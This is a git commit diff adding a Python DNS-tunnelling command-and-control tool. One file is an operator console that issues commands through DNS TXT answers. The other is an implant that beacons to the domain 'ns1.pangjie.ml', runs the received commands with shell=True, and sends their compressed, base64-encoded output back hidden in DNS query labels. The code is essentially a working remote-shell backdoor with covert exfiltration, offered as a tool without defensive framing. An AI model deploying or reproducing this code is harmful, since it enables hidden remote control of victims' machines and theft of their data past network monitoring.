8b4770be4c93386665fb5494c3cf80e62f524d11
cate4cafe <cate4cafe@gmail.com>
2019-05-21 02:14:05 -0700

    version1.0

---
+++ dns_client.py
@@ -0,0 +1,70 @@
+# -*- coding:utf-8 -*-
+
+from gevent import socket
+from dnslib import *
+import zlib
+import base64
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.bind(('192.10.22.22', 53))
+IP = "1.1.1.1"
+b64str = ''
+
+
+def dns_handle(s, addr, data, command):
+    request = DNSRecord.parse(data)
+    id = request.header.id
+    qname = request.q.qname
+    qtype = request.q.qtype
+    reply = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)
+    flag = 0
+    global b64str
+    if qtype == QTYPE.A:
+        if qname.label[0] != 'end':
+            str = ''.join(qname.label).replace('ns1pangjieml', '')
+            b64str += str
+        else:
+            print zlib.decompress(base64.b64decode(b64str.replace('-', '+').replace('~', '=')))
+            b64str = ''
+            flag = 1
+        reply.add_answer(RR(qname, qtype, rdata=A(IP)))
+        
+    elif qtype == QTYPE.TXT:
+        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(command)))
+        if 'sleep' in command:
+            flag = 1
+    s.sendto(reply.pack(), addr)
+    return flag
+
+
+def dns_connect(s, addr, data):
+    request = DNSRecord.parse(data)
+    id = request.header.id
+    qname = request.q.qname
+    qtype = request.q.qtype
+    reply = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)
+    if qtype == QTYPE.A:
+        if 'success' in qname.label:
+            reply.add_answer(RR(qname, QTYPE.TXT, rdata=A(IP)))
+            s.sendto(reply.pack(), addr)
+            return True
+    else:
+        return False
+
+
+if __name__ == '__main__':
+    print 'waitting connect........'
+    while True:
+        data, addr = s.recvfrom(8192)
+        if dns_connect(s, addr, data):
+            print 'connect success'
+            break
+    while True:
+        command = raw_input('#')
+        while True:
+            data, addr = s.recvfrom(8192)
+            if dns_handle(s, addr, data, command):
+                command = ''
+                break
+
+
--- dns_server.py
+++ dns_server.py
@@ -1,72 +1,158 @@
 # -*- coding:utf-8 -*-
 
-from gevent import socket
-from dnslib import *
+import socket
+import struct
+import random
+import subprocess
+import Queue
 import zlib
 import base64
+import re
+import time
 
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.bind(('192.10.22.22', 53))
-IP = "1.1.1.1"
-b64str = ''
-
-
-def dns_handle(s, addr, data, command):
-    request = DNSRecord.parse(data)
-    id = request.header.id
-    qname = request.q.qname
-    qtype = request.q.qtype
-    reply = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)
-    flag = 0
-    global b64str
-    if qtype == QTYPE.A:
-        if 'end' in qname.label:
-            print zlib.decompress(base64.b64decode(b64str.replace('-', '+').replace('~', '=')))
-            reply.add_answer(RR(qname, qtype, rdata=A(IP)))
-            s.sendto(reply.pack(), addr)
-            flag = 1
-            return flag
-        str = ''.join(qname.label).replace('ns1pangjieml', '')
-        b64str += str
-        reply.add_answer(RR(qname, qtype, rdata=A(IP)))
-        s.sendto(reply.pack(), addr)
-        flag = 1
-    elif qtype == QTYPE.TXT:
-        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(command)))
-        print command
-        flag = 1
-        s.sendto(reply.pack(), addr)
-    return flag
+dns_server = '192.10.22.22'
+port = 53
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sp = 10
 
 
-def dns_connect(s, addr, data):
-    request = DNSRecord.parse(data)
-    id = request.header.id
-    qname = request.q.qname
-    qtype = request.q.qtype
-    reply = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)
-    if qtype == QTYPE.A:
-        if 'success' in qname.label:
-            reply.add_answer(RR(qname, QTYPE.TXT, rdata=A(IP)))
-            s.sendto(reply.pack(), addr)
-            return True
+# dns请求
+def dns_query(query_type, domain):
+    # 构造dns协议头
+    qtypt = {'A': 0x0001, 'TXT': 0x0010}
+    id = random.randint(-32768, 32767)
+    idchars = struct.pack('!h', id)
+    flags = 0x0100
+    questions = 0x001
+    auswerrrs = 0x0000
+    authorityrrs = 0x0000
+    additionalrrS = 0x0000
+    bufheader = struct.pack('!hhhhhh', id, flags, questions, auswerrrs, authorityrrs, additionalrrS)
+    # 构造dns协议尾
+    searchtype = qtypt[query_type]
+    searchclass = 0x0001
+    buftail = struct.pack('!hh', searchtype, searchclass)
+    # Queries区域
+    domaintobyte = ''
+    domainsplit = domain.split('.')
+    for ds in domainsplit:
+        packstr = 'B%ds' % len(ds)
+        domaintobyte += struct.pack(packstr, len(ds), ds)
+    domaintobyte += '\0'
+    # 拼接完整请求
+    querydata = bufheader + domaintobyte + buftail
+    sock.sendto(querydata, (dns_server, port))
+    data, addr = sock.recvfrom(8096)
+    return data, idchars
+
+
+# 解析返回包
+def dns_answer(domain):
+    data = dns_query('TXT', domain)[0]
+    # 跳过协议头
+    bitnumber = 12
+    # 应答资源数
+    answerrrs = struct.unpack('!h', data[6:8])[0]
+    # 请求中域名结束后填充\x00, 在应答中表示域名结束，后面为answer内容
+    while data[bitnumber] != '\x00':
+        bitnumber += 1
+    # 域名结束
+    bitnumber += 1
+    # 跳过请求中的Type,Class In
+    bitnumber += 4
+    for i in range(answerrrs):
+        # 跳过表示指向请求中域名的c00c指针
+        bitnumber += 2
+        # 判断返回请求类型
+        # A请求
+        if data[bitnumber:bitnumber + 2] == '\x00\x01':
+            # 跳过应答中的Type,Class In，TTL,data length
+            bitnumber += 10
+            # 获取ip，4个字节
+            iptuple = struct.unpack('!BBBB', data[bitnumber:bitnumber + 4])
+            ipstr = '%d.%d.%d.%d' % iptuple
+            print ipstr
+        # TXT请求
+        elif data[bitnumber:bitnumber + 2] == '\x00\x10':
+            # 跳过应答中的Type,Class In，TTL,data length
+            bitnumber += 10
+            # 获取 TXT Length
+            txt_lenght = struct.unpack('!B', data[bitnumber:bitnumber + 1])[0]
+            # 跳过TXT length 一个字节
+            bitnumber += 1
+            unpackstr = '!'
+            for i in range(txt_lenght):
+                unpackstr += 's'
+            txt_tuple = struct.unpack(unpackstr, data[bitnumber:bitnumber + txt_lenght])
+            txt_text = ''
+            for i in txt_tuple:
+                txt_text += i
+            return txt_text
+
+
+# 执行命令，zlib压缩命令输出再base64编码之后分割, 通过A请求发送到服务器
+def exec_command(command):
+    post_queue = Queue.Queue()
+    global sp
+    print sp
+    if command is not None:
+        if 'sleep' in command:
+            sp = int(command.split(' ')[1])
+        try:
+            ss = zlib.compress(subprocess.check_output(command, shell=True))
+            ss_b64 = base64.b64encode(ss)
+            # 公共域名解析服务器在域名请求中不支持+ = 替换
+            ll = ss_b64.replace('+', '-').replace('=', '~')
+        except BaseException, e:
+            if repr(e) == 'CalledProcessError()':
+                ss = zlib.compress('command error')
+                ss_b64 = base64.b64encode(ss)
+                # 公共域名解析服务器在域名请求中不支持+ = 替换
+                ll = ss_b64.replace('+', '-').replace('=', '~')
+    if len(ll) < 51:
+        post_queue.put(ll)
+        post_queue.put('end')
+    # 分割
     else:
-        return False
+        textArr = re.findall('.{51}', ll)
+        textArr.append(ll[(len(textArr) * 51):])
+        length = len(textArr)
+        if length / 4 != 0:
+            mod = length % 4
+            for i in range(length / 4):
+                post_queue.put(textArr[i * 4 + 0] + '.' + textArr[i * 4 + 1] + '.' + textArr[i * 4 + 2] + '.' +
+                               textArr[i * 4 + 3])
+            for i in range(mod):
+                post_queue.put(textArr[length / 4 * 4 + i])
+            # 以end 标志传输完成
+            post_queue.put('end')
+        
+        else:
+            for i in range(length):
+                post_queue.put(textArr[i])
+            post_queue.put('end')
+    while post_queue.empty() is not True:
+        dns_query('A', post_queue.get() + '.' + domain)
+
+
+def connect():
+    for i in range(10):
+        try:
+            data, id = dns_query('A', 'success.ns1.pangjie.ml')
+            if data[0:2] == id:
+                return True
+                break
+            else:
+                return False
+        except:
+            pass
 
 
 if __name__ == '__main__':
-    # print "connect...."
-    # while True:
-    #     data, addr = s.recvfrom(8192)
-    #     if dns_connect(s, addr, data):
-    #         print 'connect success'
-    #         break
+    domain = 'ns1.pangjie.ml'
+    connect()
     while True:
-        command = raw_input('#>')
-        while True:
-            data, addr = s.recvfrom(8192)
-            if dns_handle(s, addr, data, command):
-                b64str = ''
-                command = ''
-                break
+        command = dns_answer(domain)               
+        exec_command(command)
+        time.sleep(sp)
 
